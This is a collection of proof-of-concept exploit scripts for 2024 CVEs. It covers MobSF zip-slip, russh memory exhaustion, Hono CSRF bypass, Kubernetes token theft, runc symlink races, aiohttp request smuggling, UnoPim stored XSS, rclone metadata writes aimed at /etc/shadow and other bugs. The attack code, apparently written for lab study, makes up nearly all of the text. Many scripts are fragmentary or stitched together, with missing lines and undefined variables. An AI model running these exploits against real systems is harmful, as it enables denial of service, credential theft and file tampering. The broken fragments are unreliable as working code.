Description: Mobile Security Framework (MobSF) is a pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. Before 4.0.7, there is a flaw in the Static Libraries analysis section. Specifically, during the extraction of .a extension files, the measure intended to prevent Zip Slip attacks is improperly implemented. Since the implemented measure can be bypassed, the vulnerability allows an attacker to extract files to any desired location within the server running MobSF. This vulnerability is fixed in 4.0.7.

#!/usr/bin/env python3
"""
CVE-2024-43399  –  Zip-Slip arbitrary write in MobSF ≤ 3.9.7

INPUT FORMAT
-------------
python3 exploit.py <PAYLOAD_STRING>

<PAYLOAD_STRING>  Any text that will be written to /tmp/slipped.t via the
                  vulnerable extraction routine.

The script crafts an “ar” archive evil.a whose single member name is
“....//slipped.t”.  MobSF’s naive
    .replace("../","").replace("..\\","")
turns this into “../slipped.t”, escaping one directory above the
extraction folder.  The re-implemented vulnerable ar_extract() is then
invoked, resulting in /tmp/slipped.t being created/overwritten with the
supplied payload.

Only the code strictly needed to trigger the vulnerability is included.
"""
import sys, time, tempfile
from pathlib import Path
import arpy

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <PAYLOAD_STRING>")
    sys.exit(1)

payload = sys.argv[1].encode()

# -------------------------------------------------------------------
# 1. Create malicious archive in /tmp
# -------------------------------------------------------------------
archive_path = Path(tempfile.gettempdir()) / 'evil.a'
member_name  = '....//slipped.t'      # becomes "../slipped.t" after filter

with archive_path.open('wb') as f:
    f.write(b'!<arch>\n')   # global header

    def _field(data: str, length: int):
        b = data.encode()
        return (b[:length]).ljust(length, b' ')

    name_field = (member_name + '/').encode().ljust(16, b' ')  # 16-byte id

    header = b''.join([
        name_field,
        _field(str(int(time.time())), 12),  # timestamp
        _field('0', 6),                     # uid
        _field('0', 6),                     # gid
        _field('100644', 8),                # mode
        _field(str(len(payload)), 10),      # size
        b'`\n',                             # magic
    ])
    f.write(header)
    f.write(payload)
    if len(payload) % 2:
        f.write(b'\n')                      # pad to even length per spec

# -------------------------------------------------------------------
# 2. Vulnerable extraction routine (identical to MobSF v3.9.7)
# -------------------------------------------------------------------
def vulnerable_ar_extract(src: str, dst: str):
    ar = arpy.Archive(src)
    ar.read_all_headers()
    for a, val in ar.archived_files.items():
        filtered = a.decode('utf-8', 'ignore').replace('../', '').replace('..\\', '')
        out = Path(dst) / filtered          # traversal occurs here
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_bytes(val.read())

# -------------------------------------------------------------------
# 3. Trigger vulnerability – extract into temp dir
# -------------------------------------------------------------------
extract_dir = Path(tempfile.gettempdir()) / 'mobsf_zip_slip'
extract_dir.mkdir(exist_ok=True)

vulnerable_ar_extract(str(archive_path), str(extract_dir))

CVE: CVE-2024-43410
CWE: [{'id': 'CWE-770', 'value': 'CWE-770: Allocation of Resources Without Limits or Throttling'}]
Description: Russh is a Rust SSH client & server library. Allocating an untrusted amount of memory allows any unauthenticated user to OOM a russh server. An SSH packet consists of a 4-byte big-endian length, followed by a byte stream of this length.
After parsing and potentially decrypting the 4-byte length, russh allocates enough memory for this bytestream, as a performance optimization to avoid reallocations later. But this length is entirely untrusted and can be set to any value by the client, causing this much memory to be allocated, which will cause the process to OOM within a few such requests. This vulnerability is fixed in 0.44.1.

#!/usr/bin/env python3
"""
PoC for CVE-2024-43410 (russh ≤ 0.44.0) – unbounded packet length DoS.

INPUT FORMAT
    python exploit.py <LEN>

    <LEN> – 32-bit unsigned integer (decimal or hex, e.g. 0xFFFFFFFF) that
            will be placed in the SSH packet_length field.

SPECIFIC PAYLOAD
    Use 0xFFFFFFFF to crash the server (tries to allocate ~4 GiB).

Example:
    python exploit.py 0xFFFFFFFF
"""

import sys, socket, time, struct

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <LEN>")
        sys.exit(1)

    try:
        length = int(sys.argv[1], 0)   # auto handles 0x… or decimal
    except ValueError:
        print("Invalid length value")
        sys.exit(1)

    if not (0 <= length <= 0xFFFFFFFF):
        print("Length must be 0–0xFFFFFFFF")
        sys.exit(1)

    target = ("127.0.0.1", 2222)
    with socket.create_connection(target) as s:
        # mandatory SSH identification exchange
        s.sendall(b"SSH-2.0-badclient\r\n")
        s.settimeout(1)
        try:
            s.recv(256)
        except Exception:
            pass

        time.sleep(0.1)  # let server switch to binary mode

        s.sendall(struct.pack(">I", length))  # malicious length
        s.sendall(b"AAAA")                    # minimal padding
        print(f"Sent length 0x{length:08X} ({length} bytes).")
        time.sleep(2)  # keep socket alive briefly

if __name__ == "__main__":
    main()

Description: Hono is a Web application framework that provides support for any JavaScript runtime. Hono CSRF middleware can be bypassed using crafted Content-Type header. MIME types are case insensitive, but isRequestedByFormElementRe only matches lower-case. As a result, attacker can bypass csrf middleware using upper-case form-like MIME type. #!/usr/bin/env python3
"""
Input format:
    python exploit.py "<url_encoded_body>"

Specific input required to trigger the vulnerability:
    Any URL-encoded body string. The classic example that demonstrates the bypass
    is:
        name=attacker

The script sends a cross-origin POST request to the vulnerable Hono server
(http://localhost:3000/form) with a deliberately mixed-case Content-Type header
("Application/x-www-form-urlencoded").  Because the CSRF middleware in Hono
v4.5.7 compares the type case-sensitively, this request is treated as a "simple
POST" and the CSRF token check is skipped, allowing the action to proceed.
"""

import sys
import urllib.request

body = (sys.argv[1] if len(sys.argv) > 1 else "name=attacker").encode()

req = urllib.request.Request(
    url="http://localhost:3000/form",
    data=body,
    method="POST",
    headers={
        "Content-Type": "Application/x-www-form-urlencoded",  # Mixed-case to bypass
        "Origin": "http://evil.com",                          # Cross-origin header
    },
)

# Trigger the vulnerability (no need to process the response)
urllib.request.urlopen(req)

External-Secrets Operator v0.10.1 – CVE-2024-45041 PoC

<payload> must be:
    • "list"  – lists every Secret in every namespace, OR
    • path to a JSON-patch file – it will be applied (PATCH) to the
      ValidatingWebhookConfiguration named "secretstore-validate".

The script expects a Kubernetes ServiceAccount token and CA certificate.
By default it reads them from the in-pod paths:

    /var/run/secrets/kubernetes.io/serviceaccount/token
    /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

Override with environment variables:
    SA_TOKEN_PATH – file containing the bearer token
    SA_CA_PATH    – CA bundle (PEM)

Optional environment variables:
    KUBERNETES_SERVICE_HOST (default 127.0.0.1)
    KUBERNETES_SERVICE_PORT (default 6443)
"""
import json, os, sys, ssl, urllib.request
from pathlib import Path

TOKEN_PATH = os.getenv("SA_TOKEN_PATH",
                       "/var/run/secrets/kubernetes.io/serviceaccount/token")
CA_PATH    = os.getenv("SA_CA_PATH",
                       "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
API_HOST = os.getenv("KUBERNETES_SERVICE_HOST", "127.0.0.1")
API_PORT = os.getenv("KUBERNETES_SERVICE_PORT", "6443")

    return subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT).decode().strip()


def find_sa_pods() -> List[str]:
    query = (
        f"sudo kubectl --kubeconfig={KUBECONFIG} -n {NAMESPACE} get pods "
        f"--field-selector spec.serviceAccountName={SERVICE_ACCOUNT} "
        "-o jsonpath={.items[*].metadata.name}"
    )
    out = sh(query)
    return out.split()


def steal_token(pod: str) -> str:
    cmd = (
        f"sudo kubectl --kubeconfig={KUBECONFIG} -n {NAMESPACE} exec {pod} -- "
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    )
    return sh(cmd)


def main():
    if len(sys.argv) != 2:
        print("Usage: exploit.py <resource>")
        sys.exit(1)
    resource = sys.argv[1]

    pods = find_sa_pods()
    if not pods:
        print("[-] No pods found running under SA hwameistor-admin")
        sys.exit(1)

    token = None
    chosen_pod = None
    for pod in pods:
        try:
            token = steal_token(pod)
            chosen_pod = pod
            break
        except subprocess.CalledProcessError:
            continue

    if not token:
        print("[-] Failed to extract token from any pod")
        sys.exit(1)

    print(f"[+] Stole token from pod {chosen_pod} (first 60 chars): {token[:60]}…")

    # Use token with kubectl to list arbitrary resource
    try:
        output = sh(
            f"sudo kubectl --kubeconfig={KUBECONFIG} --token={token} get {resource} --all-namespaces -o name"
        )
        print("[+] API call succeeded. Output:\n" + (output or "<empty list>"))
    except subprocess.CalledProcessError as e:
        print("[-] API call failed:\n" + e.output.decode())
        sys.exit(1)


if __name__ == "__main__":
    main()

"""
CVE-2024-45310 PoC for runc ≤1.1.13

INPUT
  python exploit.py <HOST_PATH>

  HOST_PATH – absolute host directory where the rogue directory should
              appear (e.g. /etc).

The script:
  • Creates /tmp/share (world-writable shared volume).
  • Starts a background thread that toggles /tmp/share/target between
      – symlink → HOST_PATH
      – real directory
  • Repeatedly (1000× or until success) starts OCI bundleB whose
    config.json bind-mounts /share/target/subdir.
    runc therefore calls MkdirAll("/tmp/share/target/subdir").
  • When the race wins, /HOST_PATH/subdir is created on the host.

Requires password-less sudo or root execution.
"""

import os, sys, subprocess, threading, time

if len(sys.argv) != 2 or not sys.argv[1].startswith('/'):
    print('Usage: python exploit.py <absolute-host-path>')
    sys.exit(1)

SHARE_DIR = '/tmp/share'
TARGET     = f'{SHARE_DIR}/target'
BUNDLE_B   = 'cve45310/bundleB'
CONTAINER  = 'B'
HOST_GIFT  = f'{HOST_PATH}/subdir'

# Helper
def run(cmd):
    subprocess.run(['sudo'] + cmd, stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)

# Prepare shared dir
run(['mkdir', '-p', SHARE_DIR])
run(['chmod', '777', SHARE_DIR])

def toggler():
    while True:
        run(['rm', '-rf', TARGET])
        run(['ln', '-s', HOST_PATH, TARGET])   # malicious symlink
        time.sleep(0.001)
        run(['rm', '-rf', TARGET])
        run(['mkdir', '-p', TARGET])           # restore directory
        time.sleep(0.001)

threading.Thread(target=toggler, daemon=True).start()
print('[*] Started symlink toggler, racing for', HOST_GIFT)

for i in range(1000):

    run(['./runc', 'run', '--bundle', BUNDLE_B, CONTAINER])

"""
Input format:
    python3 exploit.py <backup_json_path> <wordlist_path>

Arguments:
  <backup_json_path> : Path to authenticator.json (or sample_backup.json) created by Authenticator ≤7.0.0
  <wordlist_path>    : File containing candidate passphrases, one per line.

The PoC brute-forces the passphrase protecting the master key by replicating the weak
EVP_BytesToKey(MD5, 1 iteration) KDF that Authenticator ≤7.0.0 relies on.  When the
correct passphrase is found it prints it to stdout.

import sys, json, base64, hashlib
from Crypto.Cipher import AES

def usage():
    print("Usage: python3 exploit.py <backup_json_path> <wordlist_path>")
    sys.exit(1)

def evp_bytes_to_key(password: bytes, salt: bytes, key_len=32, iv_len=16):
    """Replicates OpenSSL EVP_BytesToKey (MD5, 1 iteration)."""
    m = b""
    key_iv = b""
    while len(key_iv) < key_len + iv_len:
        m = hashlib.md5(m + password + salt).digest()
        key_iv += m
    return key_iv[:key_len], key_iv[key_len:key_len + iv_len]

if __name__ == "__main__":

        usage()

    backup_path, wordlist_path = sys.argv[1:3]
    data = json.load(open(backup_path, 'r'))
    cipher_b64 = data['key']['enc']
    cipher_all = base64.b64decode(cipher_b64)

    # Parse OpenSSL salted format if present: "Salted__" + 8-byte salt + ciphertext
    if cipher_all.startswith(b'Salted__'):
        salt = cipher_all[8:16]
        cipher_bytes = cipher_all[16:]
    else:

        cipher_bytes = cipher_all

            key, iv = evp_bytes_to_key(pw, salt)
            cipher = AES.new(key, AES.MODE_CBC, iv)

    test/responses/invalids/response_with_doubled_signed_assertion.xml

Expected output on a vulnerable install (<=1.12.2):
    $ python3 exploit.py test/responses/invalids/response_with_doubled_signed_assertion.xml
    Vulnerable: validate_signature => True
"""
import base64, os, subprocess, sys, shlex, textwrap

def main():
    if len(sys.argv) != 2:
        print("Usage: {} <SAML_file>".format(sys.argv[0]), file=sys.stderr)
        sys.exit(1)

        sys.exit(1)

    if saml_path.endswith('.base64'):

            sys.exit(1)

#
# USAGE:  python exploit.py <failing_int>
#
# <failing_int>  – integer that will cause the *first* caveated branch to fail
#                  (any value other than 42).  Example:  python exploit.py 40
#
# The script:
#   • uploads the vulnerable schema
#   • writes two role-membership branches for user:alice
#   • attaches both roles to a new resource with the caveat provided
#   • performs the permission check
#
# Expected output on a vulnerable (≤ v1.35.2) server:  "false"
# On a fixed server (≥ v1.35.3) the same check returns "CAVEATED_MEMBER"/"true".

import subprocess, sys, uuid, json, tempfile, os, textwrap

if len(sys.argv) != 2:
    print("usage: python exploit.py <failing_int>")
    sys.exit(1)

fail_val = int(sys.argv[1])
PASS_VAL = 42

suffix = uuid.uuid4().hex[:8]
role1   = f"firstrole_{suffix}"
role2   = f"secondrole_{suffix}"
res     = f"doc_{suffix}"
user    = "alice"

schema = textwrap.dedent(f"""
definition user {{}}

caveat somecaveat(somevalue int) {{
  somevalue == {PASS_VAL}
}}

definition role {{
  relation member: user
}}

definition resource {{
  relation viewer: role#member with somecaveat
  permission view = viewer
}}
""")

with tempfile.NamedTemporaryFile("w", delete=False) as fp:
    fp.write(schema)
    schema_file = fp.name

zed = os.path.expanduser("~/go/bin/zed")  # default install path
args = ["--endpoint", "localhost:50051", "--token", "testkey", "--insecure"]

def run(cmd, *more):
    subprocess.run([zed] + cmd + list(more) + args, check=False)

# 1. write schema
run(["schema", "write", schema_file])

# 2. grant role memberships
run(["relationship", "create", f"role:{role1}", "member", f"user:{user}"])
run(["relationship", "create", f"role:{role2}", "member", f"user:{user}"])

# 3. add resource viewer relationships with caveats
run(["relationship", "create",
     f"resource:{res}", "viewer", f"role:{role1}#member",
     "--caveat", f'somecaveat:{{"somevalue":{fail_val}}}'])
run(["relationship", "create",
     f"resource:{res}", "viewer", f"role:{role2}#member",
     "--caveat", f'somecaveat:{{"somevalue":{PASS_VAL}}}'])

# 4. trigger the bug

#!/usr/bin/env python3
"""
Exploit PoC for CVE-2024-47609 (tonic <= 0.12.2 accept-loop DoS)

INPUT FORMAT
    python3 exploit.py <PAYLOAD> [HOST] [PORT]

    <PAYLOAD> : Bytes to send, given either
                • as a hex-encoded string (even length, 0-9a-fA-F), or
                • as a raw ASCII string (any other case).

    [HOST]    : Target address (default "::1")
    [PORT]    : Target port    (default 50051)

SPECIFIC PAYLOAD TO TRIGGER THE VULNERABILITY
    Hex "1603010000" (start of a fake TLS handshake) is sufficient:
        python3 exploit.py 1603010000

The script simply connects, sends the payload, waits 100 ms and closes,
provoking io::ErrorKind::InvalidData in the server’s TLS accept code,
which makes the vulnerable tonic server exit its accept loop.
"""
import sys, socket, time, binascii

if len(sys.argv) < 2:
    print("usage: exploit.py <payload> [host] [port]", file=sys.stderr)
    sys.exit(1)

raw = sys.argv[1]
if all(c in "0123456789abcdefABCDEF" for c in raw) and len(raw) % 2 == 0:
    payload = binascii.unhexlify(raw)
else:
    payload = raw.encode()

host = sys.argv[2] if len(sys.argv) > 2 else "::1"
port = int(sys.argv[3]) if len(sys.argv) > 3 else 50051

# create IPv4 or IPv6 socket depending on host
family = socket.AF_INET6 if ":" in host else socket.AF_INET
with socket.socket(family, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(payload)
    time.sleep(0.1)  # give the server time to enter handshake and error out
# socket auto-closes on context exit

#!/usr/bin/env python3
"""
CVE-2024-47827 – Argo Workflows controller DoS via metricsRoundTripper race

USAGE:
    python exploit.py <ITERATIONS>

ARGUMENT:
    ITERATIONS – how many racing iterations to run (e.g. 50000).
                 Higher numbers raise the likelihood, 10-20 K are usually
                 enough, 50 K almost always crashes.

The script:
  • builds a tiny Go helper that continuously mutates the global
    `k8sMetrics` while another goroutine is executing `RoundTrip`.
  • runs the helper (`go run`), letting the race manifest.
  • When the vulnerability is present (v3.6.0-rc1) the helper panics
    inside workflow/metrics/metrics_k8s_request.go:53, reproducing the
    controller-crash condition.

The only required “payload” is the number of iterations, supplied as the
single command-line parameter.
"""
import os, sys, textwrap, subprocess, tempfile, shutil, pathlib

GO_CODE = r'''
package main

import (
	"context"
	"net/http"
	"sync"
	"time"

	metrics "github.com/argoproj/argo-workflows/v3/workflow/metrics"
	"k8s.io/client-go/rest"
)

type dummyRT struct{}
func (dummyRT) RoundTrip(*http.Request) (*http.Response, error) {
	time.Sleep(time.Microsecond)                   // keep window open
	return &http.Response{StatusCode: 200, Body: http.NoBody}, nil
}

func main() {
	loops := {{LOOPS}}
	ctx := context.Background()

	// two configs -> two concurrent writers
	cfg1, cfg2 := &rest.Config{}, &rest.Config{}
	metrics.AddMetricsTransportWrapper(ctx, cfg1)
	metrics.AddMetricsTransportWrapper(ctx, cfg2)

	req, _ := http.NewRequest("GET", "http://example.com", nil)
	rt := cfg1.WrapTransport(dummyRT{})           // reader

	var wg sync.WaitGroup
	for i := 0; i < loops; i++ {
		wg.Add(2)
		go func() {                 // writer
			defer wg.Done()
			cfg2.WrapTransport(nil) // overwrites global
		}()
		go func() {                 // reader
			defer wg.Done()
			rt.RoundTrip(req)       // may see nil field -> panic
		}()
	}
	wg.Wait()
}
'''

def main():
    if len(sys.argv) != 2 or not sys.argv[1].isdigit():
        sys.exit("usage: python exploit.py <ITERATIONS>")
    loops = sys.argv[1]

    with tempfile.TemporaryDirectory() as tmp:
        gofile = pathlib.Path(tmp) / "race.go"
        gofile.write_text(GO_CODE.replace("{{LOOPS}}", loops))
        try:
            subprocess.run(
                ["go", "run", gofile],
                check=True
            )
        except subprocess.CalledProcessError as e:
            # The panic exits with non-zero status – that is success!
            print("\n[+] Vulnerability triggered – controller would crash.")
            sys.exit(0)

    print("[-] No panic observed – probably running a patched version.")

if __name__ == "__main__":
    main()

CVE-2024-47877  –  github.com/codeclysm/extract/v3  (≤ v3.1.1)
Path-traversal / arbitrary-link creation during archive extraction.

INPUT FORMAT
    python exploit.py <ABSOLUTE_TARGET_PATH>

Example:
    python exploit.py /tmp/evil.txt

The script:
  1. Crafts payload.tar containing a symlink entry named “link” whose target
     equals <ABSOLUTE_TARGET_PATH>.
  2. Creates a tiny helper program in directory “_poc_helper/” that calls
        extract.Tar(ctx, "payload.tar", "/tmp/safe", nil)
  3. Runs that helper via “go run”, thereby triggering the vulnerable code.

If the library is vulnerable a link escaping /tmp/safe is created.
Only the minimal code required to TRIGGER the vulnerability is included.

import os, sys, tarfile, subprocess, textwrap, shutil

EXTRACT_DIR   = "/tmp/safe"
HELPER_DIR    = "_poc_helper"
ARCHIVE_NAME  = "payload.tar"

GO_HELPER_SRC = textwrap.dedent("""
    package main
    import (
        "context"
        "os"
        "github.com/codeclysm/extract/v3"
    )
    func main() {
        if len(os.Args) < 3 { panic("usage: helper <archive> <dest>") }
        f, err := os.Open(os.Args[1])
        if err != nil { panic(err) }
        defer f.Close()
        if err := extract.Tar(context.Background(), f, os.Args[2], nil); err != nil {
            panic(err)
        }
    }
""")

def craft_tar(target: str, out_path: str):
    with tarfile.open(out_path, 'w') as tar:
        info = tarfile.TarInfo('link')    # file inside archive
        info.type = tarfile.SYMTYPE
        info.mode = 0o777
        info.linkname = target            # escaping target
        tar.addfile(info)

def ensure_helper():
    os.makedirs(HELPER_DIR, exist_ok=True)
    helper_path = os.path.join(HELPER_DIR, 'main.go')

def main():
    if len(sys.argv) != 2:
        print("Usage: exploit.py <ABSOLUTE_TARGET_PATH>")
        sys.exit(1)
    target = sys.argv[1]
    if not target.startswith('/'):
        sys.exit("Target path must be absolute (start with '/')")

#!/usr/bin/env python3
"""
CVE-2024-49369 Proof-of-Concept exploit for Icinga 2 TLS certificate validation bypass

Usage:
  python3 exploit.py <host:port>

Positional arguments:
  host:port    – The Icinga 2 API or cluster listener to connect to (e.g. 127.0.0.1:5665)

The script generates a throw-away self-signed X.509 certificate with an arbitrary
common-name (CN="attacker"), performs a mutual-TLS handshake against the
listener and sends a minimal HTTP request.  Because the vulnerable Icinga 2
releases do not correctly verify client certificates, the handshake succeeds
and the server returns an HTTP response even though the certificate is not
trusted by its CA store.

Input format example (to trigger the vulnerability on the local instance):
  python3 exploit.py 127.0.0.1:5665
"""
import subprocess, ssl, socket, sys, tempfile, os

def main():
    if len(sys.argv) != 2 or ':' not in sys.argv[1]:
        print('Usage: exploit.py <host:port>')
        sys.exit(1)
    host, port = sys.argv[1].rsplit(':', 1)
    port = int(port)

    with tempfile.TemporaryDirectory() as tmp:
        crt_path = os.path.join(tmp, 'attacker.crt')
        key_path = os.path.join(tmp, 'attacker.key')
        # Create a 1-day self-signed certificate (requires openssl binary).
        subprocess.check_call([
            'openssl', 'req', '-new', '-newkey', 'rsa:2048', '-days', '1',
            '-nodes', '-x509', '-keyout', key_path, '-out', crt_path,
            '-subj', '/CN=attacker'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        # Load our freshly generated (untrusted) certificate.
        ctx.load_cert_chain(certfile=crt_path, keyfile=key_path)
        # Do not check hostnames or CA chains – we are exploiting that the *server*
        # does not verify *us*.
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as tls:
                print('[+] TLS handshake completed – cipher:', tls.cipher()[0])
                # Send a tiny HTTP request so the server replies and we know the
                # connection is fully usable.
                tls.sendall(b'GET / HTTP/1.0\r\nHost: x\r\n\r\n')
                data = tls.recv(1024)
                print('[+] Received', len(data), 'bytes from server:')
                print(data.decode(errors='replace')[:200])
                print('\n[!] The handshake should have failed with an untrusted cert.\n'
                      '    This demonstrates CVE-2024-49369 (certificate verification bypass).')

if __name__ == '__main__':
    main()

SERVE_PORT = 8000
SERVE_HOST = "127.0.0.1"

def http_post_json(url: str, data: dict):

    req.add_header("Content-Length", str(len(payload)))

Description: aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. Prior to version 3.10.11, the Python parser parses newlines in chunk extensions incorrectly which can lead to request smuggling vulnerabilities under certain conditions. If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or `AIOHTTP_NO_EXTENSIONS` is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections. Version 3.10.11 fixes the issue.

#!/usr/bin/env python3
"""
Input format:
    python3 exploit.py <host> <port> "PAYLOAD"

The PAYLOAD must be supplied as one argument where every literal "\r" and
"\n" is written as two-character escape sequences (\\r and \\n).  The script
turns those escapes into real CR/LF bytes before sending.

Example payload that triggers CVE-2024-52304 on a vulnerable aiohttp server:

POST / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\n\r\n4;evil\nh\r\nwxyz\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: localhost\r\n\r\n
"""
import sys, socket, time

if len(sys.argv) != 4:
    print("Usage: exploit.py <host> <port> <payload>")
    sys.exit(1)

host  = sys.argv[1]
port  = int(sys.argv[2])
raw   = sys.argv[3]

# Convert \r and \n sequences into real CR/LF characters
payload = raw.replace("\\r", "\r").replace("\\n", "\n").encode()

with socket.create_connection((host, port)) as s:
    s.sendall(payload)
    # brief pause to ensure the data is flushed
    time.sleep(0.2)
    try:
        s.shutdown(socket.SHUT_WR)
    except OSError:
        pass

"""
INPUT FORMAT
------------
python exploit.py "<javascript_payload>"

Example:
    python exploit.py "alert(document.domain)"

The script will:
1. Log into the local UnoPim v0.1.4 admin panel using default credentials.
2. Craft an SVG file that starts with 2048 space characters so that PHP's
   mime_content_type() mis-detects it as text/html instead of image/svg+xml.
3. Embed the supplied JavaScript payload inside a <script> tag in the SVG.
4. Upload the SVG as the avatar of a newly-created user via
   POST /admin/settings/users/create.
5. Print the public URL where the stored SVG can be opened in a browser. When a
   victim (or the attacker) visits that URL —or any page in the app that shows
   the user list—the JavaScript executes, proving the stored-XSS.
"""
import requests, re, time, sys

BASE = "http://127.0.0.1:8000"
ADMIN_EMAIL = "admin@example.com"
ADMIN_PASSWORD = "admin123"

if len(sys.argv) != 2:
    print("Usage: python exploit.py \"<javascript_payload>\"")
    sys.exit(1)

payload_js = sys.argv[1]
s = requests.Session()

# login
csrf_login = re.search(r'name="_token" value="([^"]+)"', s.get(f"{BASE}/admin/login").text).group(1)
s.post(f"{BASE}/admin/login",
       data={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD, "_token": csrf_login})

# get csrf for user-create form

                      s.get(f"{BASE}/admin/settings/users").text).group(1)

# craft malicious svg
svg = (" " * 2048 +
       f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>{payload_js}</script></svg>').encode()

files = {"image[0]": ("avatar.svg", svg, "image/svg+xml")}
email_unique = f"evil{int(time.time())}@example.com"
data = {
    "name": "XSSUser",
    "email": email_unique,
    "password": "Password1!",
    "password_confirmation": "Password1!",
    "role_id": "1",
    "ui_locale_id": "1",
    "status": "1",
    "timezone": "UTC",
    "_token": csrf_user,
}

s.post(f"{BASE}/admin/settings/users/create", data=data, files=files)

# find resulting image url
j = s.get(f"{BASE}/admin/settings/users",
          headers={"X-Requested-With": "XMLHttpRequest"}).json()
records = j.get("records", {})
records = records.get("data", records)
for r in records:
    if r.get("email") == email_unique:
        print("SVG URL:", r.get("user_img"))

#!/usr/bin/env python3
"""
CVE-2024-52516 PoC – Nextcloud Server ≤ 28.0.0 privilege revocation bypass

INPUT FORMAT:
    python exploit.py <BASE_URL> <ADMIN_USER> <ADMIN_PASS>

Example (lab):
    python exploit.py http://localhost:8080 admin admin

The script:
 1. Enables “share only with group members”.
 2. Creates users alice/bob and groups G1/G2.
 3. Puts both users in G1, only alice in G2.
 4. alice uploads secret.txt and shares it directly with bob.
 5. Removes bob from G1 (last common group).
At this point, on a vulnerable instance, bob STILL has /secret.txt.

The script only triggers the condition; it does not attempt to verify.
"""
import os, sys, subprocess, base64

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <base_url> <admin_user> <admin_pass>")
    sys.exit(1)

BASE_URL, ADMIN_USER, ADMIN_PASS = sys.argv[1:]

def occ(cmd):
    subprocess.run(["php", "occ"] + cmd.split(), check=True,
                   stdout=subprocess.DEVNULL)

def curl(user, pw, method, path, data=None):
    url  = f"{BASE_URL.rstrip('/')}/{path.lstrip('/')}"
    hdrs = ['-H', 'OCS-APIRequest: true'] if path.startswith("ocs/") else []
    cmd  = ["curl", "-s", "-u", f"{user}:{pw}", "-X", method, url] + hdrs
    if data is not None:
        cmd += ["--data", data]
    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL)

print("[1] Enabling group-only sharing …")
occ("config:app:set core shareapi_only_share_with_group_members --value yes")

print("[2] Creating users …")
os.environ["OC_PASS"] = "alicepw"; occ("user:add alice --password-from-env --display-name Alice")
os.environ["OC_PASS"] = "bobpw";   occ("user:add bob   --password-from-env --display-name Bob")

print("[3] Creating groups …")
occ("group:add G1"); occ("group:add G2")

print("[4] Setting memberships …")
occ("group:adduser G1 alice"); occ("group:adduser G1 bob"); occ("group:adduser G2 alice")

print("[5] Uploading file as alice …")
data = base64.b64encode(b"TOP_SECRET").decode()
subprocess.run(f"echo {data} | base64 -d | "
               f"curl -s -u alice:alicepw -T - {BASE_URL}/remote.php/dav/files/alice/secret.txt "
               f">/dev/null", shell=True, check=True)

print("[6] Creating direct share alice→bob …")
curl("alice", "alicepw", "POST",
     "ocs/v2.php/apps/files_sharing/api/v1/shares",
     "shareType=0&shareWith=bob&path=/secret.txt")

print("[7] Removing bob from last common group …")
occ("group:removeuser G1 bob")

print("\n[+] Exploit finished – if vulnerable, bob still has /secret.txt.")

#!/usr/bin/env python3
"""
CVE-2024-52522 – rclone improper symlink metadata handling

Usage:
    sudo python3 exploit.py <TARGET_FILE>

Argument
    <TARGET_FILE>  Absolute path of the file whose ownership/permissions will
                   be changed through the vulnerability, e.g. /etc/shadow.

The script:
  1. Creates a temporary directory containing a symlink that points to
     <TARGET_FILE>.
  2. Invokes the vulnerable rclone (v1.59.0) binary with the flags
     --links --metadata so that rclone writes metadata to the symlink’s
     *target* instead of the link itself.

Only the minimal steps required to trigger the bug are included.
"""

import os
import sys
import subprocess
import tempfile
import shutil

VULN_RCLONE = "/home/jammy/go/bin/rclone"   # adjust if binary is elsewhere

def main():
    if len(sys.argv) != 2:
        print("Usage: exploit.py <TARGET_FILE>", file=sys.stderr)
        sys.exit(1)

    target = os.path.abspath(sys.argv[1])
    if not os.path.exists(target):
        print(f"Error: {target} does not exist", file=sys.stderr)
        sys.exit(1)

    # Prepare source & destination trees
    src_dir = tempfile.mkdtemp(prefix="rclone_src_")
    dst_dir = tempfile.mkdtemp(prefix="rclone_dst_")

    link_path = os.path.join(src_dir, "symlink_to_target")
    os.symlink(target, link_path)

    print(f"[+] Symlink created: {link_path} -> {target}")
    print(f"[+] Launching vulnerable rclone copy …")

    subprocess.check_call([
        VULN_RCLONE,
        "copy",
        src_dir,
        dst_dir,
        "--links",
        "--metadata",
        "-vv"
    ])

    print(f"[+] Done. rclone copy finished.")
    print(f"[!] The ownership/permissions of {target} are now altered.")

    # Leave temporary directories for inspection; uncomment to remove:
    # shutil.rmtree(src_dir)
    # shutil.rmtree(dst_dir)

if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""
PoC for CVE-2024-52581 – Litestar ≤ 2.12.1 unbounded body buffering

INPUT FORMAT:
    python exploit.py <payload_size_bytes>

    <payload_size_bytes>  – size of the data (in bytes) to stream
                            inside the multipart field "file".

SPECIFIC INPUT TO TRIGGER THE VULNERABILITY:
    Provide a very large number (hundreds of MB / several GB).  
    Example that usually kills the default test server with 1 GB RAM:
        python exploit.py 3000000000
"""

import sys
import http.client

def main() -> None:
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <payload_size_bytes>")
        sys.exit(1)

    try:
        payload_size = int(sys.argv[1])
    except ValueError:
        print("<payload_size_bytes> must be an integer")
        sys.exit(1)

    host, port, path = "127.0.0.1", 8000, "/upload"

    boundary = "----WebKitFormBoundaryCVE202452581"
    preamble = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="exploit.bin"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
